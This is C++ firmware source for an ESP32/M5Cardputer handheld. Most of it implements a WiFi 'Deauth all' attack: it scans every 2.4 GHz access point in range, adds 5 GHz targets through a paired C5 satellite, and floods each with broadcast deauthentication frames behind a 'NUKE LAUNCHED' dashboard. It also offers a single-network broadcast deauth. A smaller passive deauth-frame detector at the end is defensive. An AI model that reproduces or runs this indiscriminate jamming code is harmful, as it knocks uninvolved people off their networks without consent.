/*
 * wifi_deauth_extras — broadcast deauth (kick ALL clients on an AP at
 * once) and passive deauth detector.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_types.h"
#include "wifi_deauth_frame.h"
#include "c5_cmd.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_heap_caps.h>

/* ========== Broadcast deauth: nuke every AP in range ========== */

#define DB_MAX_APS 64

struct db_target_t {
    uint8_t bssid[6];
    uint8_t channel;
    char    ssid[24];
    bool    is_5g;   /* true -> delegate deauth to the C5 satellite */
};
static db_target_t s_b_targets[DB_MAX_APS];
static volatile int s_b_target_n = 0;
static volatile int s_b_cursor = 0;
static volatile bool     s_b_running = false;
static volatile bool     s_broad_alive = false;
static volatile uint32_t s_b_sent    = 0;
static volatile uint32_t s_b_errs    = 0;
static uint16_t          s_b_seq     = 0;

static void broad_task(void *)
{
    /* Rotate through every AP. 2.4 GHz targets are deauthed locally via
     * the usual softAP + 80211_tx path. 5 GHz targets get delegated to
     * the C5/TRIDENT satellite over ESP-NOW — the S3 can't tune to 5 GHz
     * channels, so without the C5 those APs are silent. */
    s_broad_alive = true;
    wifi_silent_ap_begin(1);
    uint32_t last_5g_cmd = 0;
    while (s_b_running) {
        if (s_b_target_n == 0) { delay(100); continue; }
        const db_target_t &t = s_b_targets[s_b_cursor % s_b_target_n];

        if (t.is_5g) {
            /* Don't hammer the C5 — one 3-second burst per 5 GHz target
             * per rotation. C5 can only run one attack at a time. */
            if (millis() - last_5g_cmd > 200) {
                c5_cmd_deauth(t.bssid, t.channel, 0 /* targeted */, 3000);
                last_5g_cmd = millis();
                /* Count the C5 frame budget against our displayed sent
                 * counter — user feedback only, not exact. 3 s / 2 ms
                 * airtime ≈ 1500 frames per C5 burst. */
                s_b_sent += 1500;
            }
            delay(400);   /* give the C5 time between rotations */
        } else {
            esp_wifi_set_channel(t.channel ? t.channel : 1, WIFI_SECOND_CHAN_NONE);
            for (int i = 0; i < 16 && s_b_running; ++i) {
                int ok = wifi_deauth_broadcast(t.bssid, &s_b_seq);
                s_b_sent += ok;
                s_b_errs += (2 - ok);
                delay(6);
            }
        }
        s_b_cursor++;
    }
    wifi_silent_ap_end();
    s_broad_alive = false;
    vTaskDelete(nullptr);
}

static void db_scan_populate(void)
{
    s_b_target_n = 0;
    /* ROOT-CAUSE FIX 2026-06-09 (serial backtrace):
     * WiFi.scanNetworks() is Arduino's API — it calls
     * WiFiGenericClass::enableSTA → wifiLowLevelInit →
     * esp_netif_create_default_wifi_sta(). But wifi_lean_sta_init()
     * already created the default STA netif via raw IDF. Arduino has
     * no idea that netif exists, so it tries to create a DUPLICATE
     * and the IDF asserts:
     *   "esp_netif_create_default_wifi_sta ... duplicate key"
     * -> instant panic-reboot. This was THE Deauth-All crash, on both
     * the AP-select 'X' route and the direct WiFi-menu route.
     *
     * Fix: scan via raw esp_wifi_scan_start (blocking) + raw
     * esp_wifi_scan_get_ap_records — same pattern wifi_scan.cpp uses
     * successfully. Never touch Arduino WiFi.* after raw-IDF init. */
    wifi_scan_config_t scfg = {};
    scfg.show_hidden          = true;
    scfg.scan_type            = WIFI_SCAN_TYPE_ACTIVE;
    scfg.scan_time.active.min = 80;
    scfg.scan_time.active.max = 150;
    /* The blocking scan below stalls the UI ~2 s. Paint a clear scanning
     * screen first so the freeze reads as intentional, not a hang. */
    ui_clear_body();
    ui_text(4, BODY_Y + 20, T_ACCENT, "SCANNING 2.4 GHz");
    ui_text(4, BODY_Y + 34, T_DIM, "finding targets...");
    esp_err_t scan_rc = esp_wifi_scan_start(&scfg, true);
    uint16_t n_u = 0;
    esp_wifi_scan_get_ap_num(&n_u);
    if (scan_rc == ESP_OK && n_u > 0) {
        uint16_t want = n_u < DB_MAX_APS ? n_u : DB_MAX_APS;
        wifi_ap_record_t *recs = (wifi_ap_record_t *)heap_caps_malloc(
            want * sizeof(wifi_ap_record_t), MALLOC_CAP_8BIT);
        if (recs) {
            uint16_t got = want;
            if (esp_wifi_scan_get_ap_records(&got, recs) == ESP_OK) {
                for (int i = 0; i < (int)got && s_b_target_n < DB_MAX_APS; ++i) {
                    db_target_t &t = s_b_targets[s_b_target_n++];
                    memcpy(t.bssid, recs[i].bssid, 6);
                    t.channel = recs[i].primary;
                    strncpy(t.ssid, (const char *)recs[i].ssid, sizeof(t.ssid) - 1);
                    t.ssid[sizeof(t.ssid) - 1] = '\0';
                    t.is_5g = false;   /* S3 scan never returns 5 GHz */
                }
            }
            free(recs);
        }
    }

    /* If a C5/TRIDENT satellite is paired, fire off a 5 GHz scan over
     * ESP-NOW and wait a moment for RESP_AP frames to land. APs we get
     * back are appended with is_5g=true so broad_task delegates their
     * deauth bursts to the C5 instead of trying to TX locally. */
    if (c5_any_online()) {
        c5_clear_results();
        c5_cmd_scan_5g(600);
        /* Scan takes ~600 ms of C5 dwell plus a couple hundred ms of
         * ESP-NOW result streaming — poll-wait up to 2 s for frames. */
        uint32_t deadline = millis() + 2000;
        uint32_t last_check = 0;
        int last_n = 0;
        while (millis() < deadline) {
            if (millis() - last_check > 150) {
                last_check = millis();
                c5_ap_t tmp[4];
                int cur = c5_aps(tmp, 4);
                if (cur == last_n && cur > 0) break;   /* quiesced */
                last_n = cur;
            }
            delay(50);
        }
        c5_ap_t aps[64];
        int n5 = c5_aps(aps, 64);
        for (int i = 0; i < n5 && s_b_target_n < DB_MAX_APS; ++i) {
            if (!aps[i].is_5g) continue;
            db_target_t &t = s_b_targets[s_b_target_n++];
            memcpy(t.bssid, aps[i].bssid, 6);
            t.channel = aps[i].channel;
            strncpy(t.ssid, aps[i].ssid, sizeof(t.ssid) - 1);
            t.ssid[sizeof(t.ssid) - 1] = '\0';
            t.is_5g = true;
        }
    }
}

/* Shared arm-promisc + spawn-task + live NUKE dashboard. Targets must
 * already be loaded into s_b_targets[0..s_b_target_n). headline picks
 * the big banner: nullptr -> "NUKE LAUNCHED" (all-APs); else the AP
 * name (single-target broadcast from the AP-detail X key). */
static void run_broadcast_dashboard(const char *banner)
{
    auto &d = M5Cardputer.Display;

    /* Re-assert STA mode + arm promisc. (Raw-IDF scan keeps the driver
     * in STA throughout, so this is just belt-and-suspenders.) */
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_mode(WIFI_MODE_STA);
    static const wifi_promiscuous_filter_t s_all_filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&s_all_filter);
    esp_wifi_set_promiscuous(true);
    s_b_sent = 0;
    s_b_errs = 0;
    s_b_cursor = 0;
    s_b_seq = (uint16_t)(esp_random() & 0x0FFF);
    s_b_running = true;
    BaseType_t tc = xTaskCreate(broad_task, "deauth_all", 4096, nullptr, 4, nullptr);
    if (tc != pdPASS) { ui_toast("task create failed", T_BAD, 1500); s_b_running = false; return; }

    uint32_t last = 0;
    uint32_t last_sent = 0;
    uint16_t color = T_ACCENT2;

    const int hy = 22;
    /* Glitch confined to a thin strip below the brackets so its per-tick
     * clear no longer wipes the whole chrome band (that full-band fill
     * every tick was the flash). */
    const int glitch_y = hy + 32;
    const int glitch_h = 12;

    /* Static chrome painted ONCE on entry — scanlines, halo headline,
     * brackets and the C5 indicator never change, so redrawing them every
     * tick (over a full-band clear) was pure flicker. */
    d.fillScreen(0x0000);
    for (int y = 0; y < SCR_H - 50; y += 4) {
        d.drawFastHLine(0, y, SCR_W, 0x0020);
    }
    {
        const char *headline = banner;
        d.setTextSize(3);
        int hw = d.textWidth(headline) * 3;
        int hx = (SCR_W - hw) / 2;
        d.setTextColor(0xF81F, 0);
        d.setCursor(hx - 2, hy); d.print(headline);
        d.setCursor(hx + 2, hy); d.print(headline);
        d.setCursor(hx, hy - 2); d.print(headline);
        d.setCursor(hx, hy + 2); d.print(headline);
        d.setTextColor(0xFFFF, 0);
        d.setCursor(hx, hy); d.print(headline);
        d.setTextSize(1);

        int bl = 14;
        d.drawFastHLine(4, hy - 6, bl, color);
        d.drawFastVLine(4, hy - 6, 4, color);
        d.drawFastHLine(4, hy + 28, bl, color);
        d.drawFastVLine(4, hy + 25, 4, color);
        d.drawFastHLine(SCR_W - 4 - bl, hy - 6, bl, color);
        d.drawFastVLine(SCR_W - 5, hy - 6, 4, color);
        d.drawFastHLine(SCR_W - 4 - bl, hy + 28, bl, color);
        d.drawFastVLine(SCR_W - 5, hy + 25, 4, color);

        if (c5_any_online()) {
            d.fillCircle(7, 6, 2, 0x07E0);           /* green dot */
            d.setTextColor(0x07E0, 0);
            d.setCursor(13, 2); d.print("C5");
        } else {
            d.fillCircle(7, 6, 2, 0x528A);           /* dim gray */
            d.setTextColor(0x528A, 0);
            d.setCursor(13, 2); d.print("C5");
        }
    }

    while (true) {
        uint32_t now = millis();

        if (now - last > 200) {
            last = now;
            int cur = s_b_target_n ? (s_b_cursor % s_b_target_n) : 0;

            /* Glitch animation only — confined to its own strip, which is
             * the only region cleared per tick. Restore the scanlines that
             * cross the strip so it blends back into the static backdrop. */
            d.fillRect(0, glitch_y, SCR_W, glitch_h, 0x0000);
            for (int y = glitch_y; y < glitch_y + glitch_h; y += 4) {
                d.drawFastHLine(0, y, SCR_W, 0x0020);
            }
            ui_glitch(0, glitch_y, SCR_W, glitch_h);

            /* Live stats ribbon — bottom third of the screen. */
            uint32_t fps = (s_b_sent - last_sent) * 5;
            last_sent = s_b_sent;

            /* Target line (big). */
            const db_target_t &t = s_b_targets[cur];
            d.fillRect(0, SCR_H - 44, SCR_W, 10, 0x0000);
            d.setTextColor(T_ACCENT2, 0);
            d.setCursor(4, SCR_H - 44);
            d.printf("-> %.20s", t.ssid[0] ? t.ssid : "<hidden>");

            /* Target detail line (dim). */
            d.fillRect(0, SCR_H - 34, SCR_W, 10, 0x0000);
            d.setTextColor(0x8410, 0);   /* mid gray, readable on glitch */
            d.setCursor(4, SCR_H - 34);
            d.printf("ch%u %02X:%02X:%02X:%02X:%02X:%02X",
                     t.channel,
                     t.bssid[0], t.bssid[1], t.bssid[2],
                     t.bssid[3], t.bssid[4], t.bssid[5]);

            /* Frames + rate (big, bright). */
            char stats[48];
            snprintf(stats, sizeof(stats), "%lu frames  %lu/s",
                     (unsigned long)s_b_sent, (unsigned long)fps);
            d.fillRect(0, SCR_H - 22, SCR_W, 10, 0x0000);
            d.setTextColor(fps > 40 ? 0x07E0 : 0xFFE0, 0);
            int sw = d.textWidth(stats);
            d.setCursor((SCR_W - sw) / 2, SCR_H - 22);
            d.print(stats);

            /* Target count + drops. */
            char meta[32];
            snprintf(meta, sizeof(meta), "%d APs  %lu drop",
                     s_b_target_n, (unsigned long)s_b_errs);
            d.fillRect(0, SCR_H - 10, SCR_W, 10, 0x0000);
            d.setTextColor(0xFFFF, 0);
            int mw = d.textWidth(meta);
            d.setCursor((SCR_W - mw) / 2, SCR_H - 10);
            d.print(meta);
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
    }
    s_b_running = false;
    /* Join the worker before tearing down promisc — otherwise its
     * trailing wifi_silent_ap_end() (5 GHz branch sleeps delay(400))
     * can race the next feature. */
    uint32_t deadline = millis() + 800;
    while (s_broad_alive && millis() < deadline) delay(5);
    delay(150);
    esp_wifi_set_promiscuous(false);
}

/* "Deauth all" — scan every 2.4 GHz AP in range and broadcast-deauth
 * them all in rotation. Entry from the WiFi menu's 'Deauth all'. */
void feat_wifi_deauth_broadcast(void)
{
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_WARN, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("NUKING ALL APs");
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 20); d.print("scanning 2.4 GHz...");
    ui_draw_footer("scanning");
    ui_radar(SCR_W / 2, BODY_Y + 60, 24, T_ACCENT);

    radio_switch(RADIO_WIFI);
    if (!wifi_lean_sta_init()) { ui_toast("STA init failed", T_BAD, 1500); return; }

    db_scan_populate();
    if (s_b_target_n == 0) { ui_toast("no APs found", T_BAD, 1500); return; }

    run_broadcast_dashboard("NUKE LAUNCHED");
}

/* "X" from the AP-detail screen — broadcast-deauth ONLY the selected
 * AP (kick every client off that one network). Distinct from 'D'
 * (feat_wifi_deauth, which broadcasts THIS AP *and* hunts its
 * individual clients) and from the menu's Deauth-All (which nukes
 * every AP in range). Previously this route mistakenly called the
 * nuke-all path, so X and Deauth-All looked identical. */
void feat_wifi_deauth_broadcast_ap(const ap_t &a)
{
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_WARN, T_BG);
    d.setCursor(4, BODY_Y + 2); d.printf("BCAST DEAUTH %.16s", a.ssid);
    ui_draw_footer("ESC=stop");

    radio_switch(RADIO_WIFI);
    if (!wifi_lean_sta_init()) { ui_toast("STA init failed", T_BAD, 1500); return; }

    /* Single target — skip the scan entirely. */
    s_b_target_n = 0;
    db_target_t &t = s_b_targets[s_b_target_n++];
    memcpy(t.bssid, a.bssid, 6);
    t.channel = a.channel;
    strncpy(t.ssid, a.ssid, sizeof(t.ssid) - 1);
    t.ssid[sizeof(t.ssid) - 1] = '\0';
    t.is_5g = false;

    run_broadcast_dashboard("KICKING");
}

/* ========== Deauth detector: passively count deauth frames ========== */

static volatile uint32_t s_det_count = 0;
static volatile uint32_t s_det_total = 0;
static uint8_t s_det_last_bssid[6] = {0};

static void det_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 26) return;
    uint8_t fc = pkt->payload[0];
    uint8_t subtype = (fc >> 4) & 0xF;
    /* 0xC = deauth, 0xA = disassociation */
    if (subtype == 0xC || subtype == 0xA) {
        s_det_count++;
        s_det_total++;
        memcpy((void *)s_det_last_bssid, pkt->payload + 16, 6);
    }
}

void feat_wifi_deauth_detect(void)
{
    radio_switch(RADIO_WIFI);
    wifi_lean_sta_init();
    /* Explicit MASK_ALL — without this, detector counts stay at 0 on
     * IDF 5.5 even though the radio appears configured. */
    static const wifi_promiscuous_filter_t s_all_filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&s_all_filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(det_cb);

    s_det_count = 0;
    s_det_total = 0;
    uint8_t ch = 1;
    bool auto_hop = true;       /* default: cycle channels 1-13 every 500ms */
    uint32_t last_hop = 0;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    ui_clear_body();
    ui_draw_footer(";/.=ch  H=hop  `=stop");
    /* Static chrome once on entry; per-tick we only overwrite the value
     * fields that actually changed via ui_text_w, so an idle screen with
     * no deauths in the air never blanks-and-repaints (the body flash). */
    {
        auto &d = M5Cardputer.Display;
        d.setTextColor(T_ACCENT, T_BG);
        d.setCursor(4, BODY_Y + 2); d.print("DEAUTH DETECT");
        d.drawFastHLine(4, BODY_Y + 12, 100, T_ACCENT);
    }
    uint32_t last = 0;
    uint32_t window_ms = millis();
    uint32_t window_count = 0;
    uint8_t  last_ch    = 0xFF;
    uint32_t last_rate  = 0xFFFFFFFF;
    uint32_t last_total = 0xFFFFFFFF;
    uint8_t  last_bssid[6] = {0};
    bool     bssid_shown = false;
    while (true) {
        if (auto_hop && millis() - last_hop > 500) {
            last_hop = millis();
            ch = (ch % 13) + 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        }
        if (millis() - last > 300) {
            last = millis();
            if (millis() - window_ms > 1000) {
                window_count = s_det_count;
                s_det_count = 0;
                window_ms = millis();
            }
            if (ch != last_ch) {
                last_ch = ch;
                ui_text_w(4, BODY_Y + 22, SCR_W - 8, T_FG, "channel : %u", ch);
            }
            if (window_count != last_rate) {
                last_rate = window_count;
                ui_text_w(4, BODY_Y + 34, SCR_W - 8, window_count > 5 ? T_BAD : T_GOOD,
                          "rate    : %lu/s", (unsigned long)window_count);
            }
            if (s_det_total != last_total) {
                last_total = s_det_total;
                ui_text_w(4, BODY_Y + 46, SCR_W - 8, T_FG, "total   : %lu", (unsigned long)s_det_total);
            }
            if (s_det_total > 0 && (!bssid_shown || memcmp(last_bssid, (const void *)s_det_last_bssid, 6) != 0)) {
                bssid_shown = true;
                memcpy(last_bssid, (const void *)s_det_last_bssid, 6);
                ui_text_w(4, BODY_Y + 60, SCR_W - 8, T_DIM,
                          "last BSSID %02X:%02X:%02X:%02X:%02X:%02X",
                          s_det_last_bssid[0], s_det_last_bssid[1], s_det_last_bssid[2],
                          s_det_last_bssid[3], s_det_last_bssid[4], s_det_last_bssid[5]);
            }
            ui_draw_status(radio_name(), "dauth-det");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { auto_hop = false; if (ch < 13) { ch++; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); } }
        if (k == '.' || k == PK_DOWN) { auto_hop = false; if (ch > 1)  { ch--; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); } }
        if (k == 'h' || k == 'H')     { auto_hop = !auto_hop; last_hop = millis(); }
    }
    esp_wifi_set_promiscuous(false);
}
